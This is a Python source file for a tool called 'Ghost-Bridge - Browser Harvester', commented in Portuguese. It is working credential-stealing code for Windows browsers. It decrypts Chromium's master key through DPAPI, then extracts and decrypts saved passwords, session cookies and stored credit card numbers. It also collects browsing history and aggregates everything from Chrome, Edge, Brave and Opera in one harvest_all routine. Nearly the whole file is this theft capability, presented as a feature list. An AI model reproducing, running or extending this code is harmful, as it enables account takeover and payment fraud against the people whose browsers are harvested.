"""
Ghost-Bridge - Browser Harvester
Extrai credenciais e dados salvos de navegadores.
"""
import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime

# Caminhos dos navegadores (Windows)
BROWSER_PATHS = {
    'chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), 
                           r'Google\Chrome\User Data'),
    'edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), 
                         r'Microsoft\Edge\User Data'),
    'brave': os.path.join(os.environ.get('LOCALAPPDATA', ''), 
                          r'BraveSoftware\Brave-Browser\User Data'),
    'opera': os.path.join(os.environ.get('APPDATA', ''), 
                          r'Opera Software\Opera Stable'),
    'firefox': os.path.join(os.environ.get('APPDATA', ''), 
                            r'Mozilla\Firefox\Profiles'),
}


class BrowserHarvester:
    """
    Extrai dados sensíveis de navegadores Chromium e Firefox.
    
    Features:
    - Senhas salvas (descriptografadas)
    - Cookies de sessão
    - Histórico de navegação
    - Cartões de crédito salvos
    - Dados de preenchimento automático
    """
    
    def __init__(self):
        self.results = {}
        
        # Tenta importar bibliotecas de criptografia
        try:
            from Crypto.Cipher import AES
            self.crypto_available = True
        except ImportError:
            try:
                from Cryptodome.Cipher import AES
                self.crypto_available = True
            except ImportError:
                self.crypto_available = False
    
    def _get_chrome_key(self, browser_path):
        """Obtém a chave de criptografia do Chrome/Edge."""
        try:
            local_state_path = os.path.join(browser_path, 'Local State')
            
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            # Chave criptografada em base64
            encrypted_key = base64.b64decode(
                local_state['os_crypt']['encrypted_key']
            )
            
            # Remove prefixo 'DPAPI'
            encrypted_key = encrypted_key[5:]
            
            # Descriptografa com DPAPI do Windows
            import win32crypt
            decrypted_key = win32crypt.CryptUnprotectData(
                encrypted_key, None, None, None, 0
            )[1]
            
            return decrypted_key
            
        except Exception as e:
            return None
    
    def _decrypt_password(self, encrypted_password, key):
        """Descriptografa senha do Chrome/Edge."""
        try:
            if not self.crypto_available:
                return "[CRYPTO_LIB_MISSING]"
            
            from Crypto.Cipher import AES
            
            # Formato: v10 ou v11 + nonce(12) + ciphertext + tag(16)
            if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                tag = encrypted_password[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
            else:
                # Método antigo (DPAPI direto)
                import win32crypt
                return win32crypt.CryptUnprotectData(
                    encrypted_password, None, None, None, 0
                )[1].decode('utf-8')
                
        except Exception as e:
            return f"[DECRYPT_ERROR: {str(e)[:30]}]"
    
    def _copy_db_file(self, db_path):
        """Copia arquivo de DB para evitar locks."""
        temp_path = db_path + "_temp"
        try:
            shutil.copy2(db_path, temp_path)
            return temp_path
        except:
            return None
    
    def harvest_passwords(self, browser='chrome'):
        """
        Extrai senhas salvas do navegador.
        
        Args:
            browser: 'chrome', 'edge', 'brave', 'opera'
            
        Returns:
            Lista de {url, username, password}
        """
        passwords = []
        browser_path = BROWSER_PATHS.get(browser)
        
        if not browser_path or not os.path.exists(browser_path):
            return {'error': f'Browser {browser} não encontrado'}
        
        # Obtém chave de criptografia
        key = self._get_chrome_key(browser_path)
        if not key:
            return {'error': 'Não foi possível obter chave de criptografia'}
        
        # Procura perfis (Default, Profile 1, etc)
        profiles = ['Default'] + [f'Profile {i}' for i in range(1, 10)]
        
        for profile in profiles:
            db_path = os.path.join(browser_path, profile, 'Login Data')
            
            if not os.path.exists(db_path):
                continue
            
            # Copia para evitar lock
            temp_db = self._copy_db_file(db_path)
            if not temp_db:
                continue
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute('''
                    SELECT origin_url, username_value, password_value 
                    FROM logins 
                    WHERE password_value != ""
                ''')
                
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    
                    if encrypted_password:
                        password = self._decrypt_password(encrypted_password, key)
                    else:
                        password = ""
                    
                    passwords.append({
                        'browser': browser,
                        'profile': profile,
                        'url': url,
                        'username': username,
                        'password': password
                    })
                
                conn.close()
                
            except Exception as e:
                pass
            finally:
                if temp_db and os.path.exists(temp_db):
                    os.remove(temp_db)
        
        return passwords
    
    def harvest_cookies(self, browser='chrome', domains=None):
        """
        Extrai cookies de sessão.
        
        Args:
            browser: Nome do navegador
            domains: Lista de domínios para filtrar (None = todos)
            
        Returns:
            Lista de cookies
        """
        cookies = []
        browser_path = BROWSER_PATHS.get(browser)
        
        if not browser_path or not os.path.exists(browser_path):
            return {'error': f'Browser {browser} não encontrado'}
        
        key = self._get_chrome_key(browser_path)
        
        profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
        
        for profile in profiles:
            # Chrome 96+ usa 'Network' subpasta
            cookie_paths = [
                os.path.join(browser_path, profile, 'Network', 'Cookies'),
                os.path.join(browser_path, profile, 'Cookies'),
            ]
            
            for cookie_path in cookie_paths:
                if not os.path.exists(cookie_path):
                    continue
                
                temp_db = self._copy_db_file(cookie_path)
                if not temp_db:
                    continue
                
                try:
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    query = '''
                        SELECT host_key, name, encrypted_value, path, 
                               expires_utc, is_secure, is_httponly
                        FROM cookies
                    '''
                    
                    if domains:
                        placeholders = ','.join(['?' for _ in domains])
                        query += f' WHERE host_key IN ({placeholders})'
                        cursor.execute(query, domains)
                    else:
                        cursor.execute(query)
                    
                    for row in cursor.fetchall():
                        host, name, encrypted_value, path, expires, secure, httponly = row
                        
                        value = self._decrypt_password(encrypted_value, key) if key else ""
                        
                        cookies.append({
                            'browser': browser,
                            'host': host,
                            'name': name,
                            'value': value[:100],  # Limita tamanho
                            'path': path,
                            'secure': bool(secure),
                            'httponly': bool(httponly)
                        })
                    
                    conn.close()
                    
                except Exception as e:
                    pass
                finally:
                    if temp_db and os.path.exists(temp_db):
                        os.remove(temp_db)
        
        return cookies
    
    def harvest_history(self, browser='chrome', limit=100):
        """
        Extrai histórico de navegação.
        
        Args:
            browser: Nome do navegador
            limit: Número máximo de entradas
        """
        history = []
        browser_path = BROWSER_PATHS.get(browser)
        
        if not browser_path or not os.path.exists(browser_path):
            return {'error': f'Browser {browser} não encontrado'}
        
        profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
        
        for profile in profiles:
            db_path = os.path.join(browser_path, profile, 'History')
            
            if not os.path.exists(db_path):
                continue
            
            temp_db = self._copy_db_file(db_path)
            if not temp_db:
                continue
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute(f'''
                    SELECT url, title, visit_count, last_visit_time
                    FROM urls
                    ORDER BY last_visit_time DESC
                    LIMIT {limit}
                ''')
                
                for row in cursor.fetchall():
                    url, title, visits, last_visit = row
                    
                    history.append({
                        'browser': browser,
                        'url': url,
                        'title': title,
                        'visits': visits
                    })
                
                conn.close()
                
            except Exception as e:
                pass
            finally:
                if temp_db and os.path.exists(temp_db):
                    os.remove(temp_db)
        
        return history
    
    def harvest_credit_cards(self, browser='chrome'):
        """Extrai cartões de crédito salvos."""
        cards = []
        browser_path = BROWSER_PATHS.get(browser)
        
        if not browser_path or not os.path.exists(browser_path):
            return {'error': f'Browser {browser} não encontrado'}
        
        key = self._get_chrome_key(browser_path)
        
        profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
        
        for profile in profiles:
            db_path = os.path.join(browser_path, profile, 'Web Data')
            
            if not os.path.exists(db_path):
                continue
            
            temp_db = self._copy_db_file(db_path)
            if not temp_db:
                continue
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute('''
                    SELECT name_on_card, expiration_month, expiration_year, 
                           card_number_encrypted
                    FROM credit_cards
                ''')
                
                for row in cursor.fetchall():
                    name, exp_month, exp_year, encrypted_number = row
                    
                    number = self._decrypt_password(encrypted_number, key) if key else ""
                    
                    cards.append({
                        'browser': browser,
                        'name': name,
                        'number': number,  # Cuidado: dado sensível
                        'expiry': f"{exp_month:02d}/{exp_year}"
                    })
                
                conn.close()
                
            except Exception as e:
                pass
            finally:
                if temp_db and os.path.exists(temp_db):
                    os.remove(temp_db)
        
        return cards
    
    def harvest_all(self):
        """Extrai tudo de todos os navegadores."""
        results = {
            'timestamp': datetime.now().isoformat(),
            'passwords': [],
            'cookies': [],
            'history': [],
            'credit_cards': []
        }
        
        for browser in ['chrome', 'edge', 'brave', 'opera']:
            try:
                passwords = self.harvest_passwords(browser)
                if isinstance(passwords, list):
                    results['passwords'].extend(passwords)
                
                cookies = self.harvest_cookies(browser)
                if isinstance(cookies, list):
                    results['cookies'].extend(cookies[:50])  # Limita
                
                history = self.harvest_history(browser, limit=50)
                if isinstance(history, list):
                    results['history'].extend(history)
                
                cards = self.harvest_credit_cards(browser)
                if isinstance(cards, list):
                    results['credit_cards'].extend(cards)
                    
            except Exception as e:
                results[f'{browser}_error'] = str(e)
        
        return results


# Teste standalone
if __name__ == "__main__":
    print("[*] Teste do Browser Harvester")
    print("[!] AVISO: Este teste acessa dados reais do navegador")
    
    harvester = BrowserHarvester()
    
    # Teste apenas histórico (menos sensível)
    history = harvester.harvest_history('chrome', limit=5)
    print(f"\n[+] Histórico Chrome: {len(history)} entradas")
    for h in history[:3]:
        print(f"  - {h['title'][:40]}...")
